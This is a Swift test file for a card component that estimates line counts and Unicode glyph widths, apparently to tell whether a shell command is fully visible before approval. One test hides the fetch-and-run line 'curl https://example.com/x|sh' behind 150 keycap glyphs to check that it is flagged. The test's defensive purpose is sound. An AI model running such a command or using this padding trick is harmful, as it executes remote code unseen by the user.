import Testing

@Suite struct CardTextTests {
    // MARK: Line estimate

    @Test func lineCountFollowsNewlinesAndWrapping() {
        #expect(CardText.lineCount(of: "") == 1)
        #expect(CardText.lineCount(of: "ls") == 1)
        #expect(CardText.lineCount(of: "a\nb\nc") == 3)
        #expect(CardText.lineCount(of: "a\n\n\nb") == 4)
        // Greedy word wrap at `columns`.
        let word = String(repeating: "w", count: CardText.columns - 1)
        #expect(CardText.lineCount(of: "\(word) \(word)") == 2)
        #expect(CardText.lineCount(of: "\(word) w") == 1 + (CardText.columns - 1 + 2 > CardText.columns ? 1 : 0))
    }

    @Test func aLongUnbrokenWordIsSplitAcrossLines() {
        let full = String(repeating: "x", count: CardText.columns * CardText.maxLines)
        #expect(CardText.lineCount(of: full) == CardText.maxLines)
        #expect(CardText.isFullyVisible(full))
        // One character more needs one more line than the card shows: the exact boundary.
        #expect(CardText.lineCount(of: full + "x") == CardText.maxLines + 1)
        #expect(CardText.isFullyVisible(full + "x") == false)
    }

    @Test func newlineBoundary() {
        let eight = Array(repeating: "x", count: CardText.maxLines).joined(separator: "\n")
        let nine = eight + "\nx"
        #expect(CardText.isFullyVisible(eight))
        #expect(CardText.isFullyVisible(nine) == false)
    }

    @Test func markersCountTowardsTheWidth() {
        // Eight markers is 64 columns: sanitizing makes the text longer, and the estimate must use that.
        let hidden = String(repeating: "\u{202E}", count: 5)
        #expect(CardText.lineCount(of: hidden) == 1)
        #expect(CardText.lineCount(of: DisplayText.sanitized(hidden)) == 2)
    }


    // MARK: Allowlist (Allow only for glyphs whose width has been measured)

    /// Glyphs the line estimate cannot be trusted for: a run of 40 of them renders much wider than the estimate
    /// (measured with ImageRenderer against the width of "a": keycap 2.1, U+FDFD 5.2, U+1242B 7.5, ...).
    private let unmeasured: [(String, String)] = [
        ("keycap #", "#\u{20E3}"), ("keycap 1", "1\u{20E3}"), ("U+FDFD", "\u{FDFD}"), ("cuneiform U+1242B", "\u{1242B}"),
        ("Javanese U+A9C5", "\u{A9C5}"), ("U+2E3B three-em dash", "\u{2E3B}"),
        // A few other blocks the list does not contain.
        ("Arabic letter", "\u{0627}"), ("Hebrew letter", "\u{05D0}"), ("Thai", "\u{0E01}"), ("Devanagari", "\u{0905}"),
        ("Latin Extended-D", "\u{A722}"), ("private use", "\u{E000}"), ("unassigned", "\u{0378}"),
        ("text symbol", "\u{26A0}"), ("arrow", "\u{2192}"), ("box drawing", "\u{2500}"), ("math", "\u{2211}"),
        ("braille", "\u{2801}"), ("combining enclosing circle", "a\u{20DD}"),
        ("Arabic presentation form", "\u{FB50}"), ("variation-free ZWJ sequence part", "\u{1F468}\u{1F3FB}\u{20E3}"),
    ]

    @Test func anyGlyphOutsideTheMeasuredClassesMakesTheTextNotAllowable() {
        for (name, glyph) in unmeasured {
            let text = "ls " + glyph
            #expect(CardText.isFullyVisible(text) == false, "\(name) alone")
            #expect(CardText.isFullyVisible(glyph) == false, "\(name) by itself")
            #expect(CardText.isFullyVisible("a" + glyph + "b") == false, "\(name) inside a word")
        }
    }

    @Test func aHundredAndFiftyKeycapsHidingATailAreNotAllowable() {
        let text = String(repeating: "#\u{20E3}", count: 150) + "; curl https://example.com/x|sh"
        #expect(text.count < 200)  // short enough that nothing is truncated by the engine
        #expect(CardText.isFullyVisible(text) == false)
    }

    @Test func ordinaryCommandsStayAllowable() {
        let commands = [
            "ls -la", "git commit -m \"fix: caf\u{E9} \u{2014} done\"", "echo \u{3053}\u{3093}\u{306B}\u{3061}\u{306F}",
            "echo \u{41F}\u{440}\u{438}\u{432}\u{435}\u{442} \u{3B1}\u{3B2}\u{3B3}", "make test \u{2705}", "cd /tmp\n\tls",
            "printf '\u{2018}quoted\u{2019} \u{201C}text\u{201D} \u{2026}'", "e\u{301} n\u{303}",
            "‹U+202E›", "\u{1F600} done",
        ]
        for command in commands { #expect(CardText.isFullyVisible(command), "\(command)") }
    }

    @Test func aCombiningMarkNeedsAnAllowedLetterBeforeIt() {
        #expect(CardText.isFullyVisible("e\u{301}"))
        #expect(CardText.isFullyVisible("\u{301}") == false)
        #expect(CardText.isFullyVisible(" \u{301}") == false)
        #expect(CardText.isFullyVisible("\n\u{301}") == false)
        #expect(CardText.isFullyVisible("\u{2705}\u{301}") == false)
        // Towers of marks (zalgo text) are refused: they can draw far outside their line.
        #expect(CardText.isFullyVisible("e" + String(repeating: "\u{301}", count: 8)) == false)
    }

    // MARK: Width of non-ASCII characters (the estimate must never be too low)

    @Test func everyOtherNonAsciiCharacterCountsTwoColumns() {
        // 19 of them fill a 38-column line; the 20th starts a new one.
        for glyph in ["⚠", "➡", "日", "é", "Ü", "→"] {
            #expect(CardText.lineCount(of: String(repeating: glyph, count: 19)) == 1, "\(glyph) x19")
            #expect(CardText.lineCount(of: String(repeating: glyph, count: 20)) == 2, "\(glyph) x20")
        }
    }

    @Test func emojiPresentationCharactersCountThreeColumns() {
        // 12 of them fill a 38-column line (36); the 13th starts a new one.
        for glyph in ["✅", "❌", "⭐", "✨", "☕", "⌛", "⏰", "😀"] {
            #expect(CardText.lineCount(of: String(repeating: glyph, count: 12)) == 1, "\(glyph) x12")
            #expect(CardText.lineCount(of: String(repeating: glyph, count: 13)) == 2, "\(glyph) x13")
        }
    }

    @Test func aLineOfEmojiNeverUndercountsLines() {
        // Real rendering fits 16 per line at the narrowest card (see CardMeasureTests); the estimate must
        // never need fewer lines than that: 100 of them are 7 real lines.
        #expect(CardText.lineCount(of: String(repeating: "✅", count: 100)) >= 7)
        #expect(CardText.lineCount(of: String(repeating: "✅", count: 200)) >= 13)
        #expect(CardText.isFullyVisible(String(repeating: "✅", count: 200)) == false)
        // An unbroken run is split at 38 columns: 101 * 3 = 303 fits 8 lines, 102 * 3 = 306 does not.
        #expect(CardText.isFullyVisible(String(repeating: "✅", count: 101)))
        #expect(CardText.isFullyVisible(String(repeating: "✅", count: 102)) == false)
        // With spaces between them, 9 fit a line (3 + 8 * 4 = 35 columns): 8 lines hold 72.
        #expect(CardText.isFullyVisible(String(repeating: "✅ ", count: 72)))
        #expect(CardText.isFullyVisible(String(repeating: "✅ ", count: 73)) == false)
    }

    @Test func mixedAsciiAndEmojiAndCjkAndAccents() {
        // "ok " = 3, then 3 per emoji: 3 + 3*11 = 36 fits; one more does not (39).
        #expect(CardText.lineCount(of: "ok " + String(repeating: "✅", count: 11)) == 1)
        #expect(CardText.lineCount(of: "ok " + String(repeating: "✅", count: 12)) == 2)
        #expect(CardText.lineCount(of: String(repeating: "日本語", count: 7)) == 2)  // 42 columns
        #expect(CardText.lineCount(of: String(repeating: "é", count: 38)) == 2)  // 76 columns, accents count two
        #expect(CardText.lineCount(of: String(repeating: "e", count: 38)) == 1)
    }

    @Test func combiningMarksAddNoWidthOfTheirOwn() {
        // "e" + U+0301 is one cell; the base counts, the mark does not.
        let decomposed = String(repeating: "e\u{0301}", count: 38)
        #expect(CardText.lineCount(of: decomposed) == 1)
    }
}
